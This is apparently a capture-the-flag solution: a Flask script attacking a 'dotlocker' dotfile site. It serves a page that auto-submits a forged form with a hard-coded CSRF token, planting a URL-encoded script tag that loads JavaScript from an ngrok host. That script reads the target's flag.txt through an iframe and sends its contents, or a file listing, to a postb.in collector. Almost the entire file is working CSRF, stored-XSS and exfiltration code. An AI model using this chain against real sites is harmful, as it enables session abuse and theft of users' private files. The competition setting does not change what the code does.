import os

from flask import Flask, request, abort, send_from_directory, render_template, session, redirect, url_for, Response

app = Flask(__name__)

# Text value below is literally just this, which bootstraps a new JS file every time as I want to edit things
# if [ </span><script src="http://3f5f510541c4.ngrok.io/script.js"></script> ]; then

HTML = """
<html>
    <h1>Hello, goodbye!</h1>

    <form name='x' action="http://dotlocker.hackthe.vote/save" method="POST">
        <div class="field">
          <div class="control">
            <input class="input" type="text" name="name" id="nameprompt" placeholder="Dotfile Name" value="asdf">
            <input type="hidden" name="text" id="textbody">
            <input type="hidden" name="_csrf_token" value="e991d39e30cee6c53494428e12e9632092aa735d2c19d5081595f7c57da3755e">
            <input type="hidden" name="_id" value="5f8f7cc164359d236ef1fc81">
          </div>
        </div>
    </form>

    <script>
        document.x.text.value = decodeURIComponent('%69%66%20%5b%20%3c%2f%73%70%61%6e%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%33%66%35%66%35%31%30%35%34%31%63%34%2e%6e%67%72%6f%6b%2e%69%6f%2f%73%63%72%69%70%74%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%20%5d%3b%20%74%68%65%6e')
        document.x.submit();
    </script>
</html>
"""

@app.route('/', methods=['GET','POST'])
def index():
    return Response(HTML, mimetype='text/html')

@app.route('/script.js')
def script():
    print(request)
    return """
var iframe = document.createElement('iframe');

// Phase 1 iframe should load the files directory
//iframe.setAttribute('src', 'http://dotlocker.hackthe.vote/files/');

// Phase 2 iframe should load the individual file
iframe.setAttribute('src', 'http://dotlocker.hackthe.vote/files/flag.txt');

// Phase 1: enumerating all the files
// iframe.onload = function() { 
//     let files = [];
//     iframe.contentDocument.documentElement.querySelectorAll('.box').forEach((item) => { files.push(item.innerText) })
//     var img = document.createElement('img');
//     img.setAttribute('src', 'https://postb.in/1603684417670-7872029298450?' + new URLSearchParams({
//         files: files,
//     }));
// }; 

// Phase 2: getting file contents
iframe.onload = function() { 
    var img = document.createElement('img');
    // Ship everything off to postbin for capture
    img.setAttribute('src', 'https://postb.in/1603684417670-7872029298450?' + new URLSearchParams({
        content: iframe.contentDocument.documentElement.innerText,
    }));
}; 

document.body.appendChild(iframe);
"""

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1')